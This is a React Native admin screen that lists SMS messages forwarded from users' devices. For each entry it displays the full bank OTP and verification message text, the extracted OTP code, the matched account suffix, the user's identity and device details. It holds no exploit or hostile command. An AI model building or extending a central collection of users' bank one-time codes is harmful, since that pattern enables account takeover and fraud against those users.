import { useAuth } from "@/contexts/AuthContext";
import { useAdminSmsLogs } from "@/hooks/useAdminSmsLogs";
import { Ionicons } from "@expo/vector-icons";
import { Redirect } from "expo-router";
import { useState } from "react";
import {
    FlatList,
    RefreshControl,
    StyleSheet,
    Text,
    TextInput,
    TouchableOpacity,
    View
} from "react-native";

function formatDate(value?: string | null) {
    if (!value) {
        return "Not available";
    }

    const date = new Date(value);

    if (Number.isNaN(date.getTime())) {
        return "Not available";
    }

    return new Intl.DateTimeFormat("en-IN", {
        day: "numeric",
        month: "short",
        year: "numeric",
        hour: "numeric",
        minute: "2-digit",
        hour12: true,
    }).format(date);
}

function truncateBody(value: string) {
    const normalized = value.trim();
    if (normalized.length <= 120) {
        return normalized;
    }

    return `${normalized.slice(0, 120)}...`;
}

export default function Logs() {
    const { loading, profile } = useAuth();
    const { loading: logsLoading, refreshing, searchInput, logs, totalLogs, setSearchInput, refreshLogs } = useAdminSmsLogs();
    const [expandedLogId, setExpandedLogId] = useState<string | null>(null);

    if (loading) {
        return null;
    }

    if (profile?.role !== "admin") {
        return <Redirect href="/(tabs)" />;
    }

    if (logsLoading && logs.length === 0) {
        return (
            <View style={styles.container}>
                <Ionicons name="sync-outline" size={56} color="#64748B" />
                <Text style={styles.title}>Loading SMS Logs</Text>
                <Text style={styles.desc}>
                    Pulling the latest bank OTP and verification messages from the admin feed.
                </Text>
            </View>
        );
    }

    if (logs.length === 0) {
        return (
            <View style={styles.container}>

                <Ionicons
                    name="document-text-outline"
                    size={60}
                    color="#374151"
                />

                <Text style={styles.title}>No Logs Yet</Text>

                <Text style={styles.desc}>
                    Bank OTP and verification SMS logs will appear here once
                    SMS forwarding is enabled and matched messages are received.
                </Text>

                <Text style={styles.hint}>
                    Device onboarding and forwarding setup will unlock this admin log feed.
                </Text>

            </View>
        );
    }

    const renderItem = ({ item }: { item: typeof logs[number] }) => {
        const expanded = expandedLogId === item.id;
        const uploadStatusColor =
            item.uploadStatus === "forwarded"
                ? "#22C55E"
                : item.uploadStatus === "failed"
                    ? "#FCA5A5"
                    : "#FACC15";

        return (
            <TouchableOpacity
                activeOpacity={0.9}
                style={styles.card}
                onPress={() => setExpandedLogId(expanded ? null : item.id)}
            >
                <View style={styles.cardTopRow}>
                    <View style={styles.cardInfo}>
                        <Text style={styles.sender}>{item.sender}</Text>
                        <Text style={styles.userLine}>
                            {item.user.name?.trim() || item.user.email || "Unknown user"}
                        </Text>
                    </View>

                    <View style={[styles.statusBadge, { borderColor: uploadStatusColor }]}>
                        <Text style={[styles.statusText, { color: uploadStatusColor }]}>
                            {item.uploadStatus.toUpperCase()}
                        </Text>
                    </View>
                </View>

                <View style={styles.metaRow}>
                    <Text style={styles.metaText}>
                        {item.bankName || item.rule.messageType || item.messageType}
                    </Text>
                    <Text style={styles.metaText}>{formatDate(item.receivedAt)}</Text>
                </View>

                <Text style={styles.bodyText}>
                    {expanded ? item.messageBody : truncateBody(item.messageBody)}
                </Text>

                <View style={styles.detailGrid}>
                    <Text style={styles.detailText}>OTP: {item.otpCode || "Not extracted"}</Text>
                    <Text style={styles.detailText}>Retries: {item.retryCount}</Text>
                    <Text style={styles.detailText}>
                        Account Suffix: {item.matchedAccountSuffix || "Not matched"}
                    </Text>
                    <Text style={styles.detailText}>
                        Device: {item.device.deviceName || item.device.installationId || "Unknown"}
                    </Text>
                    <Text style={styles.detailText}>
                        App Version: {item.device.appVersion || "Unknown"}
                    </Text>
                </View>

                {item.failureReason ? (
                    <Text style={styles.failureText}>Failure: {item.failureReason}</Text>
                ) : null}
            </TouchableOpacity>
        );
    };

    return (
        <View style={styles.listContainer}>
            <Text style={styles.heading}>
                SMS Logs <Text style={styles.count}>({totalLogs})</Text>
            </Text>

            <View style={styles.searchBox}>
                <Ionicons name="search" size={16} color="#94A3B8" />
                <TextInput
                    placeholder="Search sender, bank, OTP, user..."
                    placeholderTextColor="#64748B"
                    style={styles.input}
                    value={searchInput}
                    onChangeText={setSearchInput}
                    autoCapitalize="none"
                    autoCorrect={false}
                />
            </View>

            <FlatList
                data={logs}
                keyExtractor={(item) => item.id}
                renderItem={renderItem}
                contentContainerStyle={styles.list}
                refreshControl={
                    <RefreshControl
                        tintColor="#A78BFA"
                        refreshing={refreshing}
                        onRefresh={() => void refreshLogs()}
                    />
                }
            />
        </View>
    );
}

const styles = StyleSheet.create({

    container: {
        flex: 1,
        backgroundColor: "#0B1220",
        justifyContent: "center",
        alignItems: "center",
        paddingHorizontal: 40
    },

    listContainer: {
        flex: 1,
        backgroundColor: "#0B1220",
        paddingHorizontal: 16,
        paddingTop: 18,
    },

    heading: {
        color: "#F8FAFC",
        fontSize: 24,
        fontWeight: "700",
        marginBottom: 16,
    },

    count: {
        color: "#94A3B8",
        fontSize: 16,
        fontWeight: "600",
    },

    searchBox: {
        flexDirection: "row",
        alignItems: "center",
        gap: 10,
        backgroundColor: "#111827",
        borderRadius: 14,
        paddingHorizontal: 14,
        paddingVertical: 12,
        marginBottom: 14,
    },

    input: {
        flex: 1,
        color: "#F8FAFC",
        fontSize: 14,
    },

    list: {
        paddingBottom: 120,
        gap: 12,
    },

    card: {
        backgroundColor: "#111827",
        borderRadius: 18,
        padding: 16,
        borderWidth: 1,
        borderColor: "#1F2937",
    },

    cardTopRow: {
        flexDirection: "row",
        justifyContent: "space-between",
        alignItems: "flex-start",
        gap: 12,
    },

    cardInfo: {
        flex: 1,
    },

    sender: {
        color: "#F8FAFC",
        fontSize: 16,
        fontWeight: "700",
    },

    userLine: {
        color: "#94A3B8",
        fontSize: 13,
        marginTop: 4,
    },

    statusBadge: {
        borderWidth: 1,
        borderRadius: 999,
        paddingHorizontal: 10,
        paddingVertical: 5,
    },

    statusText: {
        fontSize: 11,
        fontWeight: "700",
    },

    metaRow: {
        flexDirection: "row",
        justifyContent: "space-between",
        gap: 12,
        marginTop: 12,
    },

    metaText: {
        color: "#A78BFA",
        fontSize: 12,
        fontWeight: "600",
    },

    bodyText: {
        color: "#E5E7EB",
        fontSize: 14,
        lineHeight: 20,
        marginTop: 12,
    },

    detailGrid: {
        marginTop: 14,
        gap: 6,
    },

    detailText: {
        color: "#94A3B8",
        fontSize: 12,
    },

    failureText: {
        color: "#FCA5A5",
        fontSize: 12,
        marginTop: 12,
    },

    title: {
        color: "#fff",
        fontSize: 20,
        fontWeight: "600",
        marginTop: 16,
        marginBottom: 8
    },

    desc: {
        color: "#9CA3AF",
        fontSize: 14,
        textAlign: "center",
        lineHeight: 20
    },

    hint: {
        color: "#6B7280",
        fontSize: 12,
        marginTop: 14,
        textAlign: "center"
    }

});
